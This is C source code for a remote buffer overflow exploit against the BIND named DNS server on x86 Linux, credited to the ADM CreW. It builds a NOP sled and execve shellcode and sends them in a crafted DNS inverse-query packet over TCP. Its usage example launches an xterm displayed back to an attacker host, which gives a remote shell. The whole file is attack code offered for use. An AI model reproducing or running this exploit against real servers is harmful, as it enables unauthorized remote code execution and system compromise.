/*
   ___      ______      _       _
   /     \   |   _   \   |  \   /  |
   |  / \  |  |  |  \  |  |   \_/   |
   | |___| |  |  |_ /  |  |   \_/   |
   ..oO  THE          |  ---  |  |       /   |  |   |  |         CreW Oo..
   '''   '''   '''''''    ''''   ''''        
   presents
   named remote overflow sploits
   x86    linux       

   ps: we are not the first guyz who have write the sploits but like nobody
   wanna give it to us we've make our own sploit ;) *celebrate*! :)

   ripped a lot from the vuln test proggies of 
   Joshua J. Drake (jdrake@pulsar.net)
   thx to him :)
 */


#define NOP 0x90

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netdb.h>
#include <getopt.h>


void handle_alarm ();
int lookup_host ();
void attack_bind ();
int make_keypkt ();
int send_packet ();
void usage ();

char buff[10000];


char basecode1[100] = "\x5e\x31\xc0\xb0";

char basecode2[500] = "\x89\xf7\x29\xc7\x89\xf3\x89"
"\xf9\x89\xf2\xac\x3c\xfe\x74\x10\xfe\xc0\x75\xf7\x88\x46\xff\x89\x17\x89"
"\xf2\x83\xc7\x04\xeb\xeb\x31\xc0\xab\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\x40"
"\xcd\x80\xe8\xc9\xff\xff\xff";


char shellcode[500];


void 
addchar (char *str, char ch)
{
  unsigned int len;

  len = strlen (str);
  str[len] = ch;
  str[len + 1] = 0;
}



void 
usage (char *prog)
{
  printf ("--= The ADM CreW =--\n"
	  "%s victim arg0 arg1 ...\n"
	  "ex:sploits www.juergen.ch /usr/X11R6/bin/xterm"
	  " -display ppp666.hax0r.com:0\n"
	  ,prog);
  exit (0);
}


void
main (argc, argv)
     int argc;
     char *argv[];
{
  int i;
  struct sockaddr_in ra;
  char *ptr;
  char *endbuff;
  unsigned long addr;
  unsigned char jmp;

  int offset = 2700;		/* 2200 --> 3500 */
  int bsize = 1536;


  if (strstr (argv[1], "-h"))
    usage (argv[0]);

  strcpy (shellcode, "\xeb");

  if ((argc - 2) < 5)
    jmp = 0x32;
  else
    jmp = 0x32 + ((argc - 2 - 4) * 4);

  addchar (shellcode, jmp);

  for (i = 4; i < (argc - 2); i++)
    strcat (shellcode, "1234");

  strcat (shellcode, basecode1);

  if ((argc - 2) < 5)
    jmp = 0x39;
  else
    jmp = 0x39 + ((argc - 2 - 4) * 4);

  addchar (shellcode, jmp);

  strcat (shellcode, basecode2);

  for (i = 2; i < argc; i++)
    {
      strcat (shellcode, argv[i]);
      strcat (shellcode, "\xff");
    }
  strcat (shellcode, "\xfe");

  addr = 0xbffffff0 - offset;

  printf ("buffer size set to %i\n", bsize);
  printf ("offset set to %i\n", offset);
  printf ("using address: 0x%lx\n", addr);

  endbuff = buff + bsize;

  for (ptr = buff; ptr < (endbuff - strlen (shellcode) - 8); ptr++)
    *ptr = NOP;
  for (i = 0; i < strlen (shellcode); i++)
    *(ptr++) = shellcode[i];
  *((long *) ptr) = addr - 16;
  *((long *) (ptr + 4)) = addr;
  *(ptr + 9) = 0;

  if (!lookup_host (&ra, argv[1], NAMESERVER_PORT))
    return;

  srand (time (NULL));
  attack_bind (ra);
}

int
lookup_host (ra, hn, rp)
     struct sockaddr_in *ra;
     char *hn;
     unsigned short rp;
{
  ra->sin_family = AF_INET;
  ra->sin_port = htons (rp);
  if ((ra->sin_addr.s_addr = inet_addr (hn)) == -1)
    {
      struct hostent *he;

      if ((he = gethostbyname (hn)) != (struct hostent *) NULL)
	{
	  memcpy (&ra->sin_addr.s_addr, he->h_addr, 4);
	  return 1;
	}
      else
	herror ("Unable to resolve hostname");
    }
  else
    return 1;
  return 0;
}

void
attack_bind (ra)
     struct sockaddr_in ra;
{
  int sd, pktlen;
  char keypkt[6000],  rname[6000];
  struct hostent *he;


  if ((sd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror ("cannot open tcp socket");
      return;
    }
  printf ("Connecting to nameserver via TCP..");
  fflush (stdout);
  signal (SIGALRM, handle_alarm);
  alarm (15);
  if (connect (sd, (struct sockaddr *) &ra, sizeof (ra)) == -1)
    {
      perror ("Unable to connect");
      close (sd);
      return;
    }
  printf (".done.\n");
  alarm (0);

  if ((he = gethostbyaddr ((char *) &ra.sin_addr, sizeof (ra.sin_addr), AF_INET)) == (struct hostent *) NULL)
    sprintf (rname, "%s", inet_ntoa (ra.sin_addr));
  else
    strncpy (rname, he->h_name, sizeof (rname));



  pktlen = make_keypkt (keypkt);
  send_packet (sd, keypkt, pktlen);
  printf ("u hax0r\n");
  close (sd);
  exit (-1);

}

void
handle_alarm (sn)
     int sn;
{
  alarm (0);
  signal (SIGALRM, SIG_DFL);
  printf ("Unable to connect: Connection timed out\n");
  exit (0);
}

int
make_keypkt (pktbuf)
     char *pktbuf;
{
  HEADER *dnsh;
  char *ptr = pktbuf;
  int pktlen = 0;
  unsigned long ttl = 31337;


  memset (pktbuf, 0, sizeof (pktbuf));

/* fill the dns header */
  dnsh = (HEADER *) ptr;
  dnsh->id = htons (rand () % 65535);
  dnsh->qr = 0;
  dnsh->opcode = IQUERY;
  dnsh->aa = 0;
  dnsh->tc = 0;
  dnsh->rd = 1;
  dnsh->ra = 1;
  dnsh->unused = 0;
/* removed for portability (it's zero already)
   dnsh->pr             = 0;
 */
  dnsh->rcode = 0;
  dnsh->qdcount = htons (0);
  dnsh->ancount = htons (1);
  dnsh->nscount = htons (0);
  dnsh->arcount = htons (0);
  pktlen += sizeof (HEADER);
  ptr += sizeof (HEADER);
/* this is the domain name (nothing here) */
  *(ptr++) = '\0';
  pktlen++;
/* fill out the rest of the rr */

  PUTSHORT (T_A, ptr);
  PUTSHORT (C_IN, ptr);
  PUTLONG (ttl, ptr);
  PUTSHORT ((strlen (buff) + 1), ptr);

  memcpy (ptr + 1, buff, strlen (buff) + 1);
  ptr = ptr + (strlen (buff) + 1);

  pktlen += ((sizeof (short) * 3) + sizeof (long) + (strlen (buff) + 1));

  return pktlen;
}

int
send_packet (sd, pktbuf, pktlen)
     int sd, pktlen;
     char *pktbuf;
{
  char tmp[2], *tmpptr;

  tmpptr = tmp;
  PUTSHORT (pktlen, tmpptr);
  if (write (sd, tmp, 2) != 2 || write (sd, pktbuf, pktlen) != pktlen)
    {
      perror ("write failed");
      return 0;
    }
  return 1;
}
